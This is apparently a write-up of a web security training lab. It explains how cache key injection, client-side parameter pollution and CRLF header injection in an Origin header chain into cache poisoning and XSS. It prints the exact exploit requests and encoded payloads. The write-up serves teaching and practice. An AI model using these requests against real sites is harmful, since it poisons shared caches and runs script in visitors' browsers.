# Cache Key Injection




## Lab Overview



This lab contains multiple independent vulnerabilities that can be chained together to achieve XSS in the victim's 

browser.



The main vulnerability chain is:



**Cache Key Injection → Client-Side Parameter Pollution → Response Header Injection → Cache Poisoning → XSS**



The goal is to make the victim execute:


```javascript

alert(1)

```



---



## 1. Cache Key Behavior



The `/login` endpoint contains a redirect where the `utm_content` parameter is excluded from the cache key due to a 
flawed regular expression.



This allows us to append arbitrary unkeyed content to the `lang` parameter:



```text

/login?lang=en?utm_content=anything


```



This behavior is important because it allows us to manipulate how the cache interprets the URL without changing the 
effective cache key in the expected way.



---



## 2. Client-Side Parameter Pollution


The `/login/` page imports:



```text

/js/localize.js

```



The `lang` parameter is incorporated into the JavaScript resource URL without being properly URL-encoded.



This creates a **Client-Side Parameter Pollution (CSPP)** vulnerability.



By controlling `lang`, we can inject additional parameters into the URL used to load `localize.js`.



---



## 3. Response Header Injection



The `/js/localize.js` endpoint is vulnerable to response header injection through the `Origin` request header when:



```text

cors=1

```



is supplied.



CRLF sequences can be used to inject additional response data:



```text

%0d%0a

```



For example:



```http

Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)

```



Conceptually, this attempts to produce:



```http

Content-Length: 8



alert(1)

```



---



## 4. Discovering Cache Key Injection



The following header can be used to inspect the cache key:



```http

Pragma: x-get-cache-key

```



This reveals that the application is vulnerable to **cache key injection**.



The important observation is that the cache and backend do not interpret the crafted URL in exactly the same way.



This discrepancy allows us to reach the vulnerable `Origin` behavior through a crafted URL.



---



## 5. Chaining the Vulnerabilities



The vulnerabilities can be chained as follows:



```text

Cache Key Injection

        ↓

Control parameters through the URL

        ↓

Client-Side Parameter Pollution

        ↓

Manipulate the localize.js request

        ↓

cors=1

        ↓

Origin Header Injection

        ↓

Inject alert(1)

        ↓

Cache Poisoning

        ↓

Victim loads poisoned login page

        ↓

XSS executes

```


---



## 6. Exploit Requests



### Request 1 — Poison `localize.js`



```http

GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2

Host: LAB-ID.web-security-academy.net

Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

```



Important components:



* `utm_content` exploits the cache-key behavior.

* `cors=1` enables the vulnerable response behavior.

* The `Origin` header contains a CRLF injection payload.



---



### Request 2 — Poison `/login`



```http

GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 
HTTP/2

Host: LAB-ID.web-security-academy.net

```



The encoded characters are important because the payload must survive multiple stages of URL parsing.



For example:



```text

%26  → &

%25  → %

%23  → #

```




---



## 7. HTTP/2 Header Case



The injected header must be lowercase:



```text

origin

```



rather than:



```text

Origin

```



HTTP/2 requires header field names to be lowercase.



This is important when performing HTTP/2-based testing in Burp Suite.



---



## Key Takeaways



### Cache Key Injection



A discrepancy between URL parsing by the cache and backend can allow an attacker to manipulate the cache key or cached 
response.



### Client-Side Parameter Pollution


Unsafe construction of URLs from user-controlled parameters can allow an attacker to inject additional parameters.



### Response Header Injection



CRLF characters can sometimes be used to inject additional HTTP response headers or response content.



### Cache Poisoning



If an attacker can cause a malicious response to be stored under a cache key that other users request, the cached 
response can affect subsequent visitors.



### Main Lesson



This lab demonstrates that individually limited vulnerabilities can become much more powerful when chained:



```text

Cache Key Injection

        +

CSPP

        +

Response Header Injection

        +

Cache Poisoning
        =

XSS

```
